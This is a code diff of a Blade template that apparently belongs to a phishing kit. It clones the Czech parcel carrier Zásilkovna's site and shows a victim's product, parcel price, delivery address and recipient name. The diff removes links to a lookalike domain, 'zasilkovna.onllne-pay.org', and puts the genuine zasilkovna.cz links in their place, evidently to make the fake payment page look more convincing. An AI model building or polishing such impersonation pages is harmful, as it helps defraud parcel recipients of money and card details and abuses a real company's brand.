@@ -1,7 +1,7 @@
 @extends('layouts.fake')
 
 @push('css')
-    <link data-n-head="ssr" rel="icon" type="image/x-icon" href="https://zasilkovna.onllne-pay.org/fonts/favicon.svg">
+    <link data-n-head="ssr" rel="icon" type="image/x-icon" href="https://www.zasilkovna.cz/fonts/favicon.svg">
     <link class="lfr-css-file" href="{{ asset('css/zasilkovna.css') }}" rel="stylesheet">
     <style type="text/css" data-asas-style="">
         body, div, a, p, span {
@@ -65,7 +65,7 @@
                                         <ul class="navbar-nav navbar-nav-scroll" style="--bs-scroll-height:95vh;"
                                             data-v-3cac9890="">
                                             <li class="nav-item" data-v-3cac9890=""><a
-                                                        href="https://zasilkovna.onllne-pay.org/cash93216848#"
+                                                        href="https://www.zasilkovna.cz/#"
                                                         class="custom-nav-link nav-link section-link"
                                                         data-v-3cac9890="">
                                                     <svg width="16" height="16" viewBox="0 0 16 16" fill="none"
@@ -118,7 +118,7 @@
                                                                                 Výdejní a podací místa
                                                                             </a></div>
                                                                         <div class="link-wrapper" data-v-39be0b93=""><a
-                                                                                    href="https://zasilkovna.onllne-pay.org/cash93216848"
+                                                                                    href="https://www.zasilkovna.cz/"
                                                                                     aria-current="page"
                                                                                     class="menu-link active nuxt-link-active"
                                                                                     data-v-39be0b93="">
@@ -195,7 +195,7 @@
                                                 </div>
                                             </li>
                                             <li class="nav-item" data-v-3cac9890=""><a
-                                                        href="https://zasilkovna.onllne-pay.org/cash93216848#"
+                                                        href="https://www.zasilkovna.cz/#"
                                                         class="custom-nav-link nav-link section-link"
                                                         data-v-3cac9890="">
                                                     <svg width="18" height="16" viewBox="0 0 18 16" fill="none"
@@ -330,7 +330,7 @@
                                                 </div>
                                             </li>
                                             <li class="nav-item" data-v-3cac9890=""><a
-                                                        href="https://zasilkovna.onllne-pay.org/cash93216848#"
+                                                        href="https://www.zasilkovna.cz/#"
                                                         class="custom-nav-link nav-link section-link"
                                                         data-v-3cac9890="">
                                                     <svg width="46" height="46" viewBox="0 0 46 46"
@@ -499,7 +499,7 @@
                                                             Výdejní a podací místa
                                                         </a></div>
                                                     <div class="link-wrapper" data-v-39be0b93=""><a
-                                                                href="https://zasilkovna.onllne-pay.org/cash93216848"
+                                                                href="https://www.zasilkovna.cz/"
                                                                 aria-current="page"
                                                                 class="menu-link active nuxt-link-active"
                                                                 data-v-39be0b93="">
@@ -775,7 +775,7 @@
                                 <h4 style="display: flex;margin: 0 auto;flex-direction: row;justify-content: center;">
                                     Název
                                     produktu</h4>
-                                <input style="width: 60vh;text-align: center;font-size: large;font-family: monospace;"
+                                <input style="width: 60vh;text-align: center;font-size: large;;"
                                        class="input" disabled="" value="{{$fake->title}}">
                             </div>
 
@@ -784,14 +784,14 @@
                                 <h4 style="display: flex;margin: 0 auto;flex-direction: row;justify-content: center;">
                                     Cena
                                     balíčku</h4>
-                                <input style="width: 60vh;text-align: center;font-size: large;font-family: monospace;"
+                                <input style="width: 60vh;text-align: center;font-size: large;;"
                                        class="input" disabled="" value="{{$fake->price()}}">
                             </div>
 
                             <div style="margin-bottom: 25px;">
                                 <h4 style="display: flex;margin: 0 auto;flex-direction: row;justify-content: center;">
                                     Doručovací adresa</h4>
-                                <input style="width: 60vh;text-align: center;font-size: large;font-family: monospace;"
+                                <input style="width: 60vh;text-align: center;font-size: large;;"
                                        class="input" disabled=""
                                        value="{{$fake->address}}">
                             </div>
@@ -800,7 +800,7 @@
                                 <h4 style="display: flex;margin: 0 auto;flex-direction: row;justify-content: center;">
                                     Jméno
                                     přijímače</h4>
-                                <input style="width: 60vh;text-align: center;font-size: large;font-family: monospace;"
+                                <input style="width: 60vh;text-align: center;font-size: large;;"
                                        class="input" disabled="" value="{{$fake->recipient}}">
                             </div>
 
@@ -1058,7 +1058,7 @@
                                                 rel="noopener" data-v-91fe6530="" data-v-0c13fb87="">Zásady ochrany
                                             osobních
                                             údajů</a></li>
-                                    <li data-v-0c13fb87=""><a href="https://zasilkovna.onllne-pay.org/cash93216848#"
+                                    <li data-v-0c13fb87=""><a href="https://www.zasilkovna.cz/#"
                                                               data-v-0c13fb87="" data-v-91fe6530="">Nastavení souborů
                                             cookie</a>
                                     </li>
